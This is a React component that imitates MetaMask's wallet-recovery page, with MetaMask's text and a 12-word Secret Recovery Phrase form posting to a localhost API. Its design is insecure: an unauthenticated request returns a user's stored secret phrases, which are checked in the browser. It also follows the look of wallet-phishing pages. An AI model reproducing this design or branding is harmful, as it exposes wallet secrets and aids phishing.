import { React, useState } from 'react';

function SecurityLogin() {
    let [userPhrases, setUserPhrases] = useState([]);
    const showHide = (e) => {
        e.preventDefault();
        e.target.classList.toggle("toggle-password");
        if (e.target.innerText == 'visibility') {
            e.target.innerText = 'visibility_off';
        }
        else {
            e.target.innerText = 'visibility';
        }
        let input = e.target.closest('.MuiFormControl-root').querySelector('.jss12');
        if (input.getAttribute("type") == "password") {
            input.setAttribute("type", "text");
        }
        else {
            input.setAttribute("type", "password");
        }
    }

    const loginWithPhase = async ()=>{
        if (!userPhrases){
            return;
        }
        let options = {
            method: 'POST',
            body: JSON.stringify({secret_phrases: userPhrases})
        }
        let response = await fetch('http://127.0.0.1:8000/api/login/', options);
        let result = await response.json();
        console.log('result>>>', result);
    }
    const getUserPhrases = async ()=>{
        let username = document.getElementById('username').value;
        let response = await fetch(`http://127.0.0.1:8000/api/secret-phrases/${username}/`);
        let result = await response.json();
        console.log('result>>>', result);
        if (result.status == true){
            let userPhrases = [];
            document.getElementById('username').setAttribute('disabled', true);
            for (let phrase of result.secret_phrases){
                userPhrases.push(phrase);
            }
            setUserPhrases(userPhrases);
            let inputs = document.getElementsByClassName('jss12');
            for (let i = 0; i < inputs.length; i++) {
                inputs[i].removeAttribute('disabled');
            }
            document.getElementsByClassName('user-verified')[0].style.display = 'revert';
        }
        else{
            console.log('error -', result.error);
        }
    }
    const checkPhrases = () => {
        let alert = document.getElementsByClassName('mm-banner-alert')[0];
        let inputs = document.getElementsByClassName('jss12');
        let allEmpty = true;
        for (let i = 0; i < inputs.length; i++) {
            if (inputs[i].value !== ''){
                allEmpty = false;
                break;
            }
            else{
                allEmpty = true;
            }
        }
        if (allEmpty){
            alert.style.display = 'none';
        }
        else{
            alert.style.display = 'flex';
        }
        let inputPhrases = [];
        for (let input of inputs){
            let phrase = input.value;
            inputPhrases.push(phrase);
        }
        let matchPhrases = true;
        let confirmBTN = document.getElementsByClassName('button-1')[0];
        for (let i = 0; i < userPhrases.length; i++) {
            if (userPhrases[i] !== inputPhrases[i]) {
                matchPhrases = false;
                confirmBTN.setAttribute('disabled', true);
                confirmBTN.style.pointerEvents = 'none';
                confirmBTN.style.backgroundColor = '#0376c980';
            }
        }
        if (matchPhrases && inputPhrases.length === 12){
            confirmBTN.removeAttribute('disabled');
            confirmBTN.style.pointerEvents = 'revert';
            confirmBTN.style.backgroundColor = '#0376c9';
            alert.style.display = 'none';
            return
        }
        else{
            alert.style.display = 'revert';
        }
        let invalidError = false;
        for (let i = 0; i < inputs.length; i++) {
            if (inputs[i].value !== '' && inputPhrases.length === 12){
                invalidError = true
            }
            else{
                invalidError = false;
            }
        }
        if (invalidError){
            document.getElementsByClassName('mm-text')[0].innerText = 'Invalid Secret Recovery Phrase';
        }
        else{
            document.getElementsByClassName('mm-text')[0].innerText = 'Secret Recovery Phrases contain 12';
        }
    }
    return (
        <div className="main-wrap-content">
            <section className="parent-recovery">
                <div className="box box--margin-bottom-4 box--flex-direction-row">
                    <ul className="progressbar"><li className="active">Confirm secret recovery phrase</li>
                        <li className="">Create password</li>
                    </ul>
                </div>
                <div className="main-wrapper">
                    <h2>Access your wallet with your Secret Recovery Phrase
                    </h2>
                    <h4>MetaMask cannot recover your password. We will use your Secret Recovery Phrase to validate your ownership, restore your wallet and set up a new password. First, enter the Secret Recovery Phrase that you were given when you created your wallet.<span>Learn more
                    </span>
                    </h4>
                </div>
                <div>
                    <div className="col-lg-6">
                        <h4 className="secret-recovery">Type your Secret Recovery Phrase</h4>
                    </div>
                    <div className="col-lg-6">
                        <form action="">
                            <select className="phrase" id="phrase" name="cars" disabled>
                                <option value="1">I have a 12-word phrase</option>
                                <option value="2">I have a 15-word phrase</option>
                                <option value="3">I have a 18-word phrase</option>
                                <option value="4">I have a 21-word phrase</option>
                                <option value="5">I have a 24-word phrase</option>
                            </select>
                        </form>
                    </div>
                </div>
                <div className="col-lg-12 bg-blue">
                    <h5><i className="fa fa-info-circle " aria-hidden="true"></i> You can paste your entire secret recovery phrase into any field</h5>
                </div>
                <div className="row">
                    <form>
                        <input id="username" onBlur={getUserPhrases} />
                        <svg class="ft-green-tick user-verified" xmlns="http://www.w3.org/2000/svg" height="25" width="25" viewBox="0 0 48 48" aria-hidden="true">
                            <circle class="circle" fill="#5bb543" cx="24" cy="24" r="22"/>
                            <path class="tick" fill="none" stroke="#FFF" stroke-width="6" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M14 27l5.917 4.917L34 17"/>
                        </svg>
                        <div className="col-lg-4 col-6 col-md-4 ">
                            <div className="import-srp__srp-word">
                                <label>
                                    <p>
                                        1.
                                    </p>
                                </label>
                                <div className="MuiFormControl-root MuiTextField-root d-flex">
                                    <input className="jss12 " disabled type="password" onChange={checkPhrases} />
                                    <div className="show-hide-toggle">
                                        <span className="field-icon toggle-password" onClick={showHide}>
                                            <span className="material-icons">visibility_off</span>
                                        </span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div className="col-lg-4 col-6 col-md-4">
                            <div className="import-srp__srp-word">
                                <label>
                                    <p>
                                        2.
                                    </p>
                                </label>
                                <div className="MuiFormControl-root MuiTextField-root d-flex">
                                    <input className="jss12 " disabled type="password" onChange={checkPhrases} />
                                    <div className="show-hide-toggle">
                                        <span className="field-icon toggle-password" onClick={showHide}>
                                            <span className="material-icons">visibility_off</span>
                                        </span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div className="col-lg-4 col-6 col-md-4">
                            <div className="import-srp__srp-word">
                                <label>
                                    <p>
                                        3.
                                    </p>
                                </label>
                                <div className="MuiFormControl-root MuiTextField-root d-flex">
                                    <input className="jss12 " disabled type="password" onChange={checkPhrases} />
                                    <div className="show-hide-toggle">
                                        <span className="field-icon toggle-password" onClick={showHide}>
                                            <span className="material-icons">visibility_off</span>
                                        </span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div className="col-lg-4 col-6 col-md-4">
                            <div className="import-srp__srp-word">
                                <label>
                                    <p>
                                        4.
                                    </p>
                                </label>
                                <div className="MuiFormControl-root MuiTextField-root d-flex">
                                    <input className="jss12 " disabled type="password" onChange={checkPhrases} />
                                    <div className="show-hide-toggle">
                                        <span className="field-icon toggle-password" onClick={showHide}>
                                            <span className="material-icons">visibility_off</span>
                                        </span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div className="col-lg-4 col-6 col-md-4">
                            <div className="import-srp__srp-word">
                                <label>
                                    <p>
                                        5.
                                    </p>
                                </label>
                                <div className="MuiFormControl-root MuiTextField-root d-flex">
                                    <input className="jss12 " disabled type="password" onChange={checkPhrases} />
                                    <div className="show-hide-toggle">
                                        <span className="field-icon toggle-password" onClick={showHide}>
                                            <span className="material-icons">visibility_off</span>
                                        </span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div className="col-lg-4 col-6 col-md-4">
                            <div className="import-srp__srp-word">
                                <label>
                                    <p>
                                        6.
                                    </p>
                                </label>
                                <div className="MuiFormControl-root MuiTextField-root d-flex">
                                    <input className="jss12 " disabled type="password" onChange={checkPhrases} />
                                    <div className="show-hide-toggle">
                                        <span className="field-icon toggle-password" onClick={showHide}>
                                            <span className="material-icons">visibility_off</span>
                                        </span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div className="col-lg-4 col-6 col-md-4">
                            <div className="import-srp__srp-word">
                                <label>
                                    <p>
                                        7.
                                    </p>
                                </label>
                                <div className="MuiFormControl-root MuiTextField-root d-flex">
                                    <input className="jss12 " disabled type="password" onChange={checkPhrases} />
                                    <div className="show-hide-toggle">
                                        <span className="field-icon toggle-password" onClick={showHide}>
                                            <span className="material-icons">visibility_off</span>
                                        </span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div className="col-lg-4 col-6 col-md-4">
                            <div className="import-srp__srp-word">
                                <label>
                                    <p>
                                        8.
                                    </p>
                                </label>
                                <div className="MuiFormControl-root MuiTextField-root d-flex">
                                    <input className="jss12 " disabled type="password" onChange={checkPhrases} />
                                    <div className="show-hide-toggle">
                                        <span className="field-icon toggle-password" onClick={showHide}>
                                            <span className="material-icons">visibility_off</span>
                                        </span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div className="col-lg-4 col-6 col-md-4">
                            <div className="import-srp__srp-word">
                                <label>
                                    <p>
                                        9.
                                    </p>
                                </label>
                                <div className="MuiFormControl-root MuiTextField-root d-flex">
                                    <input className="jss12 " disabled type="password" onChange={checkPhrases} />
                                    <div className="show-hide-toggle">
                                        <span className="field-icon toggle-password" onClick={showHide}>
                                            <span className="material-icons">visibility_off</span>
                                        </span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div className="col-lg-4 ">
                            <div className="import-srp__srp-word">
                                <label>
                                    <p>
                                        10.
                                    </p>
                                </label>
                                <div className="MuiFormControl-root MuiTextField-root d-flex">
                                    <input className="jss12 " disabled type="password" onChange={checkPhrases} />
                                    <div className="show-hide-toggle">
                                        <span className="field-icon toggle-password" onClick={showHide}>
                                            <span className="material-icons">visibility_off</span>
                                        </span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div className="col-lg-4 col-6 col-md-4">
                            <div className="import-srp__srp-word">
                                <label>
                                    <p>
                                        11.
                                    </p>
                                </label>
                                <div className="MuiFormControl-root MuiTextField-root d-flex">
                                    <input className="jss12 " disabled type="password" onChange={checkPhrases} />
                                    <div className="show-hide-toggle">
                                        <span className="field-icon toggle-password" onClick={showHide}>
                                            <span className="material-icons">visibility_off</span>
                                        </span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div className="col-lg-4 col-6 col-md-4">
                            <div className="import-srp__srp-word">
                                <label>
                                    <p>
                                        12.
                                    </p>
                                </label>
                                <div className="MuiFormControl-root MuiTextField-root d-flex">
                                    <input className="jss12 " disabled type="password" onChange={checkPhrases} />
                                    <div className="show-hide-toggle">
                                        <span className="field-icon toggle-password" onClick={showHide}>
                                            <span className="material-icons">visibility_off</span>
                                        </span>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div className="container">
                        </div>
                        <div className="mm-box mm-banner-base mm-banner-alert mm-banner-alert--severity-danger import-srp__srp-error mm-box--padding-3 mm-box--padding-left-2 mm-box--display-flex mm-box--gap-2 mm-box--background-color-error-muted mm-box--rounded-sm">
                            <span className="mm-box mm-icon mm-icon--size-lg mm-box--display-inline-block mm-box--color-error-default" style={{ WebkitMaskImage: 'url(danger.svg)' }}>
                            </span>
                            <div>
                                <p className="mm-box mm-text import-srp__banner-alert-text mm-text--body-md mm-box--color-text-default">Secret Recovery Phrases contain 12
                                </p>
                            </div>
                        </div>
                        <div className="row">
                            <div className="col-lg-12" >
                                <div className="center">
                                    <button className="button-1 center" onClick={loginWithPhase} disabled type="button">
                                        Confirm Secret Recovery Phrase
                                    </button>
                                </div>
                            </div>
                        </div>
                    </form>
                </div>
            </section >
        </div >
    );
}
export default SecurityLogin;